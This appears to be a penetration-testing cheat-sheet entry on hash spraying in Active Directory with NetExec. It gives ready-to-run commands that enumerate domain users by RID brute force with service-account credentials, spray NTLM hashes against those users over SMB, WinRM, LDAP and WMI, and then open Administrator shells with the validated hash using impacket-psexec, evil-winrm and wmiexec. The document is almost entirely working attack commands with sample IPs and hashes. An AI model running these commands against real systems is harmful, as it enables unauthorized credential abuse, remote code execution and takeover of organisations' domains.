---
title: Hash Spraying with NetExec
category: ad
subcategory: ad-attacks
os: linux
command: netexec smb target -u users.txt -H hashes.txt --continue-on-success
tools: netexec
---


Test every hash against every user across every protocol.

### Get full user list from the domain

```bash
netexec smb 10.10.240.35 -u 'svc_backup' -p 'Autumn2024!' --rid-brute | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f2 | tee users.txt
```

### Spray hashes over SMB

```bash
netexec smb 10.10.240.35 -u users.txt -H unique_hashes.txt --continue-on-success
```

### Over WinRM

```bash
netexec winrm 10.10.240.35 -u users.txt -H unique_hashes.txt --continue-on-success
```

### Over LDAP

```bash
netexec ldap 10.10.240.35 -u users.txt -H unique_hashes.txt --continue-on-success
```

### Over WMI

```bash
netexec wmi 10.10.240.35 -u users.txt -H unique_hashes.txt --continue-on-success
```

The `--continue-on-success` flag is critical - by default NetExec stops on first hit.

### Get a shell with the validated hash

```bash
impacket-psexec intranet.local/Administrator@10.10.240.35 -hashes :a7f3e2b14d9058c6e8b720f5d1c93ea4
evil-winrm -u Administrator -H 'a7f3e2b14d9058c6e8b720f5d1c93ea4' -i 10.10.240.35
impacket-wmiexec intranet.local/Administrator@10.10.240.35 -hashes :a7f3e2b14d9058c6e8b720f5d1c93ea4
```
